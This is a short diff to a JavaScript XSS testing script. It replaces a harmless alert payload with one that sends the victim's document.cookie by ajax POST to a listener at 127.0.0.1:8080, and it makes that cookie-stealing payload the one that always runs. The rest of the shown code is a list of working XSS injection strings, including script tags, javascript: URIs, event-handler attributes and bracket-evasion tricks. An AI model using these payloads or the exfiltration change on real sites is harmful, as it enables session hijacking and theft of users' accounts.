@@ -31,7 +31,7 @@ var XSSattack = function(message){
 };
 
 var attackVariants = [
-  '><script>alert("You are vulnerable to a Standard XSS attack: " + document.cookie)</script>',
+  '><script>$.ajax({type: "POST",url: "http://127.0.0.1:8080/",data: document.cookie,success: function(data){console.log(\'post is working\');}});</script>',
   'javascript:alert("You are vulnerable to Non-Standard Javascript XSS attacks: " + document.cookie)',
   '<a onmouseover="alert(\'You are vulnerable to Broken Tag XSS attacks: \' + document.cookie)">Injected Element</a>',
   '><<SCRIPT>alert("You are vulnerable to an Extraneous Open Bracket XSS attack: " + document.cookie);//<</SCRIPT>',
@@ -69,7 +69,8 @@ $.ajax({
 					console.log('post is working');
 				}
 			});
-			XSSattack(attackVariants[Math.floor(Math.random() * attackVariants.length)]);
+			XSSattack(attackVariants[0]);
+			// XSSattack(attackVariants[Math.floor(Math.random() * attackVariants.length)]);
 		} else {
 			window.history.back();
 		}
